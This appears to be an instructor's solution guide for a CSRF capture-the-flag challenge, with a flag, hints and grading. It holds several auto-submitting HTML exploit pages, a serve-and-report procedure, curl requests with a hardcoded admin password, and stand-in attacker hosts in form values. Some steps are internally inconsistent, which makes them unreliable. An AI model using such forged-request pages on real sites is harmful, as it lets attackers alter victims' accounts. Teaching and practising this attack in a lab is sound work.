# CSRF CTF Challenge - Solution Guide

## Vulnerability Description

This application is vulnerable to Cross-Site Request Forgery (CSRF) attacks. The `/update_profile` endpoint accepts POST requests without any CSRF token validation, allowing attackers to forge requests on behalf of authenticated users.

## Attack Flow

1. **Reconnaissance**: Students discover that:
   - The application has an admin user
   - There's a "Report" feature where admin reviews submitted URLs
   - Profile updates don't require CSRF tokens
   - Users can set a "website" field visible to others

2. **Exploitation Steps**:

   a) Create a malicious HTML page that automatically submits a form to update the admin's profile
   
   b) Host this page on an external server (or use a local server)
   
   c) Report the malicious URL to the admin bot
   
   d) When the admin bot visits the page while authenticated, the form auto-submits
   
   e) The admin's profile gets updated with attacker-controlled data
   
   f) The attacker can view the admin's updated profile (including the flag in bio) through the users list

## Example Exploit

### Option 1: Exfiltrate via Website Field

```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Check out this cool content!</h1>
    
    <form id="csrf-form" method="POST" action="http://localhost:5000/update_profile" style="display: none;">
        <input type="text" name="bio" value="Contact me on my website!">
        <input type="text" name="website" value="http://attacker-server.com/flag?data=centralctf{csrf_1s_n0t_d3ad_yet}">
    </form>

    <script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        }
    </script>
</body>
</html>
```

### Option 2: Leak Flag to Website Field

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free CTF Tips!</title>
</head>
<body>
    <h1>Loading...</h1>
    
    <iframe id="leak-frame" src="http://localhost:5000/profile" style="display:none;"></iframe>
    
    <form id="csrf-form" method="POST" action="http://localhost:5000/update_profile" style="display: none;">
        <input type="text" name="bio" id="bio-field" value="">
        <input type="text" name="website" id="website-field" value="">
    </form>

    <script>
        // Note: This won't work due to Same-Origin Policy, but demonstrates the concept
        // Students should realize they can simply modify the website field to be visible
        
        setTimeout(function() {
            document.getElementById('bio-field').value = "Check my website!";
            document.getElementById('website-field').value = "http://attacker.com/?exfiltrated";
            document.getElementById('csrf-form').submit();
        }, 2000);
    </script>
</body>
</html>
```

### Option 3: Simple Profile Update

```html
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
</head>
<body>
    <h1>Click here to claim your prize!</h1>
    <p>Processing...</p>
    
    <form id="exploit" method="POST" action="http://localhost:5000/update_profile">
        <input type="hidden" name="bio" value="HACKED - My flag is in my original bio!">
        <input type="hidden" name="website" value="http://attacker.com/gotcha">
    </form>

    <script>
        document.getElementById('exploit').submit();
    </script>
</body>
</html>
```

## Step-by-Step Exploitation

### 1. Setup Local Exploit Server

```bash
# Create exploit.html with the malicious form
echo '<!DOCTYPE html>
<html>
<head><title>Free Gift</title></head>
<body>
<h1>Loading your gift...</h1>
<form id="csrf" method="POST" action="http://localhost:5000/update_profile" style="display:none">
<input name="bio" value="PWNED - See my website for the flag">
<input name="website" value="http://YOUR-IP:8000/flag.txt">
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>' > exploit.html

# Serve it
python3 -m http.server 8000
```

### 2. Report URL to Admin

- Login to the CTF application
- Navigate to the "Report" page
- Submit: `http://YOUR-IP:8000/exploit.html`
- Wait for admin bot to visit

### 3. Check Admin Profile

- Navigate to "Users" page
- Look for admin's updated profile
- The flag will be visible in the bio or website field

## Flag

`centralctf{csrf_1s_n0t_d3ad_yet}`

## Learning Objectives

Students should understand:

1. **What is CSRF**: Cross-Site Request Forgery allows attackers to perform actions on behalf of authenticated users
2. **CSRF Token Protection**: Modern applications use CSRF tokens to validate requests
3. **Attack Requirements**: 
   - Victim must be authenticated
   - Attacker needs to know the endpoint structure
   - Attacker can trick victim into visiting malicious page
4. **Real-world Impact**: Profile changes, fund transfers, email changes, etc.
5. **Mitigation**: 
   - CSRF tokens (most common)
   - SameSite cookie attribute
   - Custom headers (for AJAX)
   - Double-submit cookies

## Alternative Solutions

### Using curl (if network accessible)

```bash
# Get admin session first (requires knowing password - not the intended solution)
# But shows how CSRF would work with stolen session

curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=admin&password=admin_secret_password_123"

curl -b cookies.txt -X POST http://localhost:5000/update_profile \
  -d "bio=HACKED&website=http://evil.com"
```

## Defense Recommendations

To fix this vulnerability:

1. **Add CSRF Protection** (Flask-WTF):
```python
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```

2. **Use SameSite Cookies**:
```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_SECURE'] = True
```

3. **Verify Referer Header** (not recommended as primary defense):
```python
if request.method == 'POST':
    referer = request.headers.get('Referer')
    if not referer or 'localhost:5000' not in referer:
        abort(403)
```

## Hints for Students (if needed)

- Hint 1: "Look at what happens when you update your profile. Are there any security checks?"
- Hint 2: "The admin automatically checks reported URLs while logged in..."
- Hint 3: "Can you make the admin's browser do something without their knowledge?"
- Hint 4: "HTML forms can submit to any URL, even if they're hosted elsewhere"
- Hint 5: "Check the Users page after the admin visits your link"

## Testing Notes

- The admin bot runs with a session, so cookies work
- The simple admin bot uses `requests` library which maintains sessions
- Redirects are followed automatically
- JavaScript in the exploit page will execute (conceptually - in full browser versions)

## Scoring Criteria

- **25%**: Identify CSRF vulnerability
- **25%**: Understand admin bot functionality  
- **25%**: Create working exploit
- **25%**: Successfully exfiltrate or display the flag